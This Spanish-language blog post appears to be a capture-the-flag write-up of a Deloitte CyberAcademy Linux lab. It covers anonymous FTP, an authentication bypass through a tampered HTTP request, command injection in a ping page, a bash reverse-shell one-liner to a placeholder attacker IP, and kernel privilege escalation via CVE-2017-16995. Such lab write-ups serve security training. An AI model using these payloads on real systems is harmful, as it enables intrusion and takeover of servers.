---
layout: post
title: "Deloitte - CyberAcademy - Linux - CTF"
date: 2025-12-14
img: /assets/img/deloitte2/banner.png
---
Deloitte es un laboratio práctico donde nuestro objetivo será aprovechar las vulnerabilidades encontradas en el servidor y encontrar 10 flags.

**Escaneo Inicial**

Una identificado el objetivo procedemos con la etapa de reconocimiento, donde haremos un escaneo a los puertos, servicios y versiones de estos.

![img1](/secnotes/assets/img/deloitte2/3.png)

El resultado de nuestro escaneo nos muestra que el servicio tiene habilitado el objetivo, empezaremos con FTP (puerto 21) este cuenta con acceso como **anonymous**, 
esto nos indica que podemos ingresar por este servicio como usuario anónimo y sin necesidad de ingresar una contraseña.

![img2](/secnotes/assets/img/deloitte2/4.png)

con el comando `get flag.txt` podemos descargar el archivo **flag.txt** a nuestra máquina, y así leerlo. Con esto obtenemos la primera bandera. 

![img3](/secnotes/assets/img/deloitte2/5.png)

Continuamos con un escaneo de directorios sobre el servicio web (puerto 80). Para esto utilizaremos la herramienta nmap junto al script http-enum, la cual hará un escaneo al objetivo con un diccionario integrado en él.

![img4](/secnotes/assets/img/deloitte2/6.png)

el resultado nos muestra una ruta interesante **/robots.txt** y **/uploads/**

![img5](/secnotes/assets/img/deloitte2/7.png)

En **robots.txt** encontramos con el texto **"disallow"** esto es una instrucción que el archivo robots utiliza para impedir que rastreadores web accedan a páginas o secciones designadas de un sitio web. En este caso **/cyberacademy**
Al ingresar a esta ruta encontramos nuestra segunda bandera

![img6](/secnotes/assets/img/deloitte2/8.png)

Al ingresar por el navegador nos encontramos en la página principal 3 enlaces.

![img7](/secnotes/assets/img/deloitte2/9.png)

El primer paso antes de visitarlos es inspeccionar el código a la página principal en busca de algo de informacion oculta o algun comentario que los desarrolladores. Con la combinación de teclas **ctrl + u** veremos el este código, y aquí encontraremos la tercera flag.

![img8](/secnotes/assets/img/deloitte2/10.png)

Ingresamos al primer enlace **Bypass_Login_1**. Aquí nos solicitarán ingresar algunas credenciales para iniciar. Estas no las tenemos, así que igual que el caso anterior inspeccionaremos el código en busca de información. 

![img9](/secnotes/assets/img/deloitte2/11.png)

Nos encontramos con una función que toma el valor ingresado por el usuario en el login y lo compara con los valores establecidos de la función. Si estos datos son incorrectos mostrará una alerta de que el usuario o contraseña son incorrectos

 ![img10](/secnotes/assets/img/deloitte2/12.png)
 
La misma funcion nos entrega las credenciales de acceso. Usuario **"admin"** y la contraseña **"supersecret"**, al ingresar estos datos encontraremos la cuarta bandera.

![img11](/secnotes/assets/img/deloitte2/13.png)


En el segundo enlace, **login_2** nos solicitarán nuevamente credenciales, al ingresar las anteriores y nos muestra un error del servidor

![img12](/secnotes/assets/img/deloitte2/14.png)

Al analizar las peticiones que se envía al servidor por parte nuestra (cliente), la aplicación nos concederá el acceso únicamente por la presencia de la cabecera **Authorization**, sin validar el contenido de esta ni las credenciales asociadas, lo que permite el acceso al sistema sin autenticación. 
Aprovechando este comportamiento, cambiaremos el metodo HTTP de **GET** a **FAIL**, y se altera el contenido de la cabecera **Authorization**. El servidor no interpreta el valor **FAIL** como un error, sino que lo procesa como un flujo v{alido dentro de su lógica interna, permitiendo el acceso por un camino no esperado.
En resumen. el servidor no verifica quién es el usuario, sino que la petición declara tener autorización para ingresar, lo que da lugar a una omisión de autenticación (**Authentication Bypass**)

![img13](/secnotes/assets/img/deloitte2/15.png)

Al enviar la solicitud obtenemos la quinta flag. 

![img14](/secnotes/assets/img/deloitte2/16.png)

De vuelta a la página principal, el tercer enlace nos envía a ping, una aplicación web que nos indica como podemos enviar un ping a una ip que se introduzca en el navegador por método GET.

![img15](/secnotes/assets/img/deloitte2/17.png)

Ingresamos el ejemplo y efectivamente el servidor hace un ping al localhost (127.0.0.1)

![img16](/secnotes/assets/img/deloitte2/18.png)

Podemos intentar concatenar comandos y ver si el servidor es vulnerable a **RCE** (remote code execution)

![img17](/secnotes/assets/img/deloitte2/19.png)

Efectivamente, podemos enviar más de un comando al navegador. Así que listaremos archivos aprovechando esta vulnerabilidad

![img18](/secnotes/assets/img/deloitte2/20.png)

Al listar los arcvhivos nos encontramos con **esto no es una flag.txt** al leerla obtenemos nuestra sexta bandera.

Ya que podemos lanzar comandos desde el navegador, indagaremos en los directorios en busqueda de información.

![img19](/secnotes/assets/img/deloitte2/21.png)

Al navegar al directorio /home/deloitte, nos encontramos la séptima bandera. 

![img20](/secnotes/assets/img/deloitte2/22.png).

también nos encontramos con **james**, como no sabemos de que tipo de arcvivo se trata, usamos el comando `file` sobre él y este nos dice que es un enlace simbólico roto hacia la ruta **/opt**

![img21](/secnotes/assets/img/deloitte2/23.png)

Ingresamos a esta ruta y nos encontramos una flag con una cadena de texto cifrada, por el tipo de caracteres que contiene, podemos asumir que es base64.

![img22](/secnotes/assets/img/deloitte2/24.png)

Decodificamos y así obtenemos nuestra octava bandera.

![img23](/secnotes/assets/img/deloitte2/25.png)

En el escaneo de directorios web, habiamos encontrado la ruta **/uploads**, al acceder a ella encontramos la novena bandera. 

![img24](/secnotes/assets/img/deloitte2/45.png)

En este punto solo nos queda la última bandera, la correspondiente al usuario root. El siguiente paso será identificar la versión de Linux de la máquina víctima, aprovechando la vulnerabilidad de RCE vamos a utilizar el comando `uname -a` para que el servidor nos muestre esta información.

![img25](/secnotes/assets/img/deloitte2/26.png)

la versión encontrada es la 4.4, en esta versión de Linux es muy común encontrar **/bin/bash**, **nc**, **Python**, **Python2** o **perl**.
Con el comando `which bash` buscaremos si está disponible en el objetivo

![img26](/secnotes/assets/img/deloitte2/27.png)

Confirmando que existe, nos crearemos una Reverse Shell para conectarnos al servidor.

![img27](/secnotes/assets/img/deloitte2/28.png)

Se probaron distintos payloads de reverse shell. El segundo payload permitió una conexión más estable, ya que redirige explícitamente la entrada, salida y errores estándar hacia el socket TCP, evitando problemas comunes al ejecutar shells interactivas desde aplicaciones web.


`bash -c "bash -i >/dev/tcp/<IP_ATACANTE>/<PUERTO> 0<&1 2>&1 &"`

una vez conectados buscaremos vulnerabilidades relacionadas con la versión del kernel de la máquina víctima.

![img28](/secnotes/assets/img/deloitte2/29.png)

![img29](/secnotes/assets/img/deloitte2/30.png)

![img30](/secnotes/assets/img/deloitte2/31.png)

Según el resultado de searchsploit encontramos que esta versión tiene una vulnerabilidad asociada al CVE-2017-16995. Sabiendo esto vamos a descargar el exploit, lo compilaremos y lo enviaremos a la máquina víctima.
Desde nuestra máquina vamos a crear un contenedor de Docker con una imagen de la misma versión de Linux a la que vamos a atacar, esto por que necesitamos compilar el exploit descargado. Si lo hacemos directamente en nuesto sistema operativo el binario del exploit queda ligado a la versión del SO, la versión del GLIBC, arquitectura y algunas opciones del compilador. 
En pocas palabras es similar a crear un programa para Windows 11 y tratar de ejecutarlo en Windows XP, el archivo existe, pero el sistema no entiende las instrucciones modernas.
Ya con el contenedor inciado y el exploit en él, procedemos a compilarlo y enviarlo a la máquina víctima.

`docker run -it --rm \
  -v $(pwd):/work \
  ubuntu:16.04 /bin/bash`

![img31](/secnotes/assets/img/deloitte2/37.png)

![img31](/secnotes/assets/img/deloitte2/38.png)

![img32](/secnotes/assets/img/deloitte2/39.png)

Levantamos un servidor con **python3** en nuestra máquina atacante, y desde la máquina víctima descargamos el exploit compilado. Una vez terminado, le damos permisos de ejecución y al inciarse obtendremos la escalada de privilegios y acceso como el usuario root.
Ahora solo nos queda navegar al directorio root y obtener la última bandera.

![img33](/secnotes/assets/img/deloitte2/10flag.png)












